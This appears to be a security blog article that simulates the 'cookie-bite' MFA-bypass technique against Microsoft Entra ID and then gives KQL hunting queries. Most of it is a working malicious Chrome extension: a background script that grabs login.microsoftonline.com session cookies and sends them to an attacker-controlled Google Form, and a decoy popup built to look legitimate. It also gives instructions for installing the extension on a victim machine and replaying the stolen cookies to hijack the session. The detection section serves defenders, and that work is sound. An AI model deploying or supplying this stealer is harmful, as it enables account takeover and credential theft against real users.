## Cookie-Bite - Simulation & Hunting  

#### Disclaimer   
_This article is intended for educational and awareness purposes only. The techniques demonstrated are for understanding security risks and improving defenses. Unauthorized use or replication of these methods for malicious activities is strictly prohibited and may be illegal. Always obtain proper authorization before testing or simulating attacks on any systems. The author is not responsible for any misuse, damage, or illegal activities resulting from applying the techniques discussed._
### Background:
Recently, the company Varonis [demonstrated](https://www.varonis.com/blog/cookie-bite#hijacking-azure-authentication) the “cookie-bite” technique, which allows attackers to bypass MFA protections on Azure authentications by stealing session cookies. This method exploits how certain authentication cookies, like those from login.microsoftonline.com, can be captured and reused to impersonate legitimate users without needing their passwords or MFA codes. Malicious browser extensions play a key role here—they can be disguised as useful tools but request permissions that let them access cookies and session data directly inside the browser.  
  
One important cookie, ESTSAUTHPERSISTENT, has a long expiry of up to 90 days, giving attackers persistent access to compromised accounts. By quietly exfiltrating these cookies—such as sending them to an external Google Form—the attacker can continuously collect fresh credentials each time the user logs in. I will demonstrate how a malicious Chrome extension can steal cookies in real time, enabling long-term session hijacking on Entra ID accounts. I will walk you through all the steps to simulate this technique

### Step1: Create a google form   
In this step, We are creating a Google Form to collect exfiltrated JSON-formatted cookie data from the victim when they log into login.microsoftonline.com  
When creating the form, choose a paragraph-style response field to accept and store long JSON-formatted cookie data, as shown. In this example the fieldname is "Cookie"    
![11](https://github.com/user-attachments/assets/4be62d5e-28a6-4391-800e-d3b808228fe9)    
Copy the url of the google form in the format ```https://docs.google.com/forms/d/e/xxxxxxxxxxxxxxxxxxx/formResponse```. We'll use this later in the Chrome extension.  

Next, open your browser’s Developer Tools (usually with Ctrl + Shift + I), then search for the keyword ``entry.`` to find the entry ID linked to the 'Cookie' field. Copy the Entry ID value highlighted in the red box below image — we'll use this later in the Chrome extension.  
![image](https://github.com/user-attachments/assets/3cc28fa4-c290-4289-af93-45f5dc8d50e6)   

### Step2: Create the chrome extension
In order to create the chrome extension, you need the following key components:  
- **manifest.json**:  
  - Defines the extension’s metadata and configuration.  
  - Declares **permissions**, which are requests to access specific parts of Chrome (e.g., tabs, cookies, storage).  
- **Background Script(background.js)**:
  -  Background script is a JavaScript process that runs silently in the background, handling events and performing tasks without requiring user interaction. In this case, the script listens for login activity on login.microsoftonline.com. When such an event is detected, it captures the browser cookies and exfiltrates them to an attacker-controlled Google Form.
  -  This script name is defined in manifest.json file as Service Worker. A service worker is a background script that acts as the extension's main event handler.  
- **popup.html**:
  -  File serves as the visible interface of the extension. It is designed to display legitimate-looking content to avoid suspicion when the user clicks on the extension icon. While it appears harmless, its real purpose is to distract the user, as the background script silently performs malicious actions such as stealing cookies or sensitive data behind the scenes.  
Now lets create each component.  

#### manifest.json  
Let me explain some of the fields in the manifest file.  
- **name:** Display name of the extension in Chrome.
- **permissions:**  
The required permissions from the chrome browser for the extension to operate.
  - cookies: Allows the extension to read/write cookies from specified sites.  
  - downloads: Enables downloading files or data (e.g., saving exfiltrated data).
  - tabs: Lets the extension access information about open tabs (like URL or title), which may be used to detect active sessions.
- **background**
  - Defines a background service worker (background.js) that runs in the background and handles logic (e.g., cookie access, network monitoring).
- **action**
  - Configures the extension’s toolbar button:
    - default_popup: HTML file displayed when the user clicks the extension icon.
    - default_title: Tooltip text shown on hover over the icon.
- **host_permissions**
   - Contains one or more match patterns that give access to one or more hosts. Here, it allows interaction with all URLs under login.microsoftonline.com, which is the Entra ID login domain.  
```
{
  "manifest_version": 3,
  "name": "Microsoft Cookie Simulation",
  "version": "1.2",
  "description": "Simulates access to Microsoft cookies for blue team training.",
  "permissions": [
    "cookies",
    "downloads",
    "tabs"
  ],
  "host_permissions": [
    "https://login.microsoftonline.com/*"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "action": {
    "default_popup": "popup.html",
    "default_title": "Simulation Active"
  }
}
```
#### background.js  
Replace the **FORM_URL** and **FIELD_NAME** placeholders in the background JavaScript script below with the actual values collected from the Google Form — specifically, the form’s response URL and the entry ID for the cookie field.  Name the file as **background.js**  
```
// Constants for Google Form
const FORM_URL = "https://docs.google.com/forms/d/e/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/formResponse";
const FIELD_NAME = "entry.1776303417"; // e.g., entry.1234567890
function extractAndExfiltrateCookies() { 
  chrome.cookies.getAll({}, (cookies) => { 
    // Filter the cookies for the ones related to Microsoft login domain
    const filteredCookies = cookies.filter(cookie => 
      cookie.domain.includes("login.microsoftonline.com")
    ); 
 
    if (filteredCookies.length === 0) { 
      return; 
    } 
 
      exfiltrateCookiesToGoogleForm(filteredCookies); 
  }); 
}

function exfiltrateCookiesToGoogleForm(cookies) { 
  const cookieJson = JSON.stringify(cookies, null, 2); 

  const formData = new URLSearchParams(); 
  formData.append(FIELD_NAME, cookieJson); 

  fetch(FORM_URL, { 
    method: "POST", 
    body: formData, 
    headers: { 
      "Content-Type": "application/x-www-form-urlencoded" 
    },
    mode: "no-cors"  // Add 'no-cors' mode to bypass CORS policy
  }).then(() => {
    console.log("Cookies exfiltrated (simulated).");
  }).catch(err => {
    console.error("Exfiltration failed:", err);
  }); 
}

// Trigger only on login page load
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.url && changeInfo.url.includes("https://login.microsoftonline.com")) {
    console.log("Detected Microsoft login, extracting cookies...");
    extractAndExfiltrateCookies();
  }
});

console.log("Background service worker loaded");
```
#### popup.html  

```
<!DOCTYPE html>
<html>
<head>
  <title>Stealer Active</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 10px;
      width: 200px;
    }
    .status {
      color: green;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h3>Microsoft Sync</h3>
  <p class="status">Status: Connected</p>
</body>
</html>

```
#### Step4: Install the extension on victim machine.
Chrome extensions can be installed in two main ways development or deployment method.
**Development mode(As folder (unpacked extension)**:
Select the folder containing your extension (which includes manifest.json, JS, HTML files, etc.).Now you have all the files ready for for the chrome extension. Now put all these three files into a folder and compress them into a zip file as shown. Once this file is delivered to victim machine you can write a powershell script to unpack the extension and you can install the extension by loading the folder.   
![image](https://github.com/user-attachments/assets/34fed01e-60bf-4b7d-a43d-f3e3d44e843a)  
- Use Case:
  - During development or manual testing.
  - Easy to modify and reload without re-packaging.
- How to Install:
  - Open Chrome and go to: _chrome://extensions/_
  - Enable _"Developer mode"_ (top right).
  - Click _"Load unpacked"_.

Install the extension manually on the victim system as shown below, or to closely mimic an attacker, use the PowerShell script provided in the Varonis blog post.  
![2025-06-04_17-42](https://github.com/user-attachments/assets/1327cf93-a411-4fdc-a37e-b1ad78ffed30)  

**As a .crx File (Packed Extension)**
You can package your Chrome extension into a `.crx` file in just a few simple steps:
- Use Case:
  - For distribution (e.g., within an organization).  
  - For sideloading or testing signed packages.
 Here is how you can do that.  
1. **Open Chrome**  
   Launch Google Chrome on your system.
2. **Go to the Extensions Page**  
   In the address bar, type: **chrome://extensions/ **

3. **Enable Developer Mode**  
Toggle the **Developer Mode** switch located in the upper-right corner of the page.  
Once enabled, additional options like "Load unpacked" and "Pack extension" will appear.

4. **Click on "Pack extension"**  
A dialog box will pop up.

5. **Select the Extension Root Directory**  
- Click **“Browse”** next to **“Extension root directory”**.  
- Navigate to and select the folder where your extension files (including `manifest.json`) are located.  
- Leave the **“Private key file”** field empty—Chrome will generate a new key automatically.

6. **Click "Pack Extension"**  
Chrome will now package your extension.

7. **Done!**  
Your `.crx` file and a corresponding `.pem` (private key) file will be generated in the **parent directory** of your extension root folder.

---

You can now use the `.crx` file to install the extension manually or you can install that automatically via powershell as well.

Once you install the chrome extension the extension looks like below.
![2025-06-04_17-45](https://github.com/user-attachments/assets/c9a39c89-0dfa-4f82-b6ad-303541da156c)   
![2025-06-04_17-46_1](https://github.com/user-attachments/assets/05b2e278-4da7-4bdf-8aa4-4238ef1a03b9)  
When the extension icon is clicked, it displays the popup.html content designed to mimic a legitimate Microsoft sync page, adding credibility to the malicious extension.  
![2025-06-04_17-46](https://github.com/user-attachments/assets/4a10bc84-64eb-4a5b-b5c5-4cf9d9e1f536)  

#### Step5: Victim logsin - credentils exfiltration.
Now, when the user logs into the Azure portal or any Microsoft login page, the extension captures the authentication cookies in real time and silently exfiltrates them to google form as shown.  
![2025-06-04_17-54](https://github.com/user-attachments/assets/0d557b73-d4e1-4e58-9dc0-6afe5aff3bf2)  
Install the [editthiscookie](https://www.editthiscookie.com/). Next open portal.azure.com login page. extension on attacker machine. And copy those cookie json value to edithiscookie extension and refresh the page.

#### Step6: Session Hijacking
- Install the [EditThisCookie](https://www.editthiscookie.com/) extension in your browser.  
- On the attacker's machine, open the login page at portal.azure.com.  
- Copy the victim’s cookie in JSON format from google form response.  
- Paste the stolen cookie data into the EditThisCookie extension.  
- Refresh the page — you should now be logged into the victim’s session, demonstrating successful session hijacking.

### Detection
The KQL query below detects if any Chrome extension was loaded using the --load-extension flag via PowerShell, which may indicate suspicious or unauthorized activity.  
```
DeviceProcessEvents
| where InitiatingProcessFileName contains "powershell" or FileName contains "powershell"
| where ProcessCommandLine contains "load-extension"
```  
The below query performs correlation with networklogs to check for any data exfiltration attempts to Google Forms. This helps confirm whether the exfiltration was successful.  
```
DeviceProcessEvents
| where InitiatingProcessFileName contains "powershell"
| where ProcessCommandLine contains "load-extension"
| project ProcessId,DeviceName
| join (DeviceNetworkEvents
| where RemoteUrl contains "docs.google.com") on DeviceName,$left.ProcessId==$right.InitiatingProcessParentId

```  
The below query correlates with fileevents to check whether any chrome extensions were written to temporary locations.  
```
DeviceProcessEvents
| where InitiatingProcessFileName contains "powershell" or FileName contains "powershell"
| where ProcessCommandLine contains "load-extension"
| join kind=rightsemi (DeviceFileEvents) on DeviceName, $left.ProcessId==$right.InitiatingProcessId
```  
In one instance I observed that when the .crx file was loaded, it was placed in the following temporary path:  
``C:\Users\<User>\AppData\Local\Temp\scoped_dirxxxxxx_xxxxxxx\cookie-bite-extension.crx``  
For detecting same 
```
DeviceFileEvents
| where FolderPath has_all(@'C:\Users\', @'AppData\Local\Temp\', ".crx")
```
Finally, you can review the Entra ID Sign-in Logs to check if the attacker successfully logged in. However, this query may produce a high volume of noise, so it’s best used as a supporting query in combination with other indicators or correlated findings.  
When an attacker logs into an account using a stolen session, several parameters may change despite having the same SessionId — such as the user agent, operating system, IP address, and geographic location. These anomalies can help indicate a potential session hijack.
```
SigninLogs
| summarize Useragentlist=make_set(DeviceDetail.browser),OS=make_set(DeviceDetail.operatingSystem),IPlist=make_list(IPAddress),make_list(DeviceDetail),City=make_set(LocationDetails.city),count() by SessionId
| where array_length(Useragentlist)>1 or array_length(OS)>1 or array_length(City)>1
```
You can download the chrome extension code from [here](https://github.com/le0li9ht/ThreatHunting/blob/main/Cloud/coockie-bite-extension.zip)

Thank You.
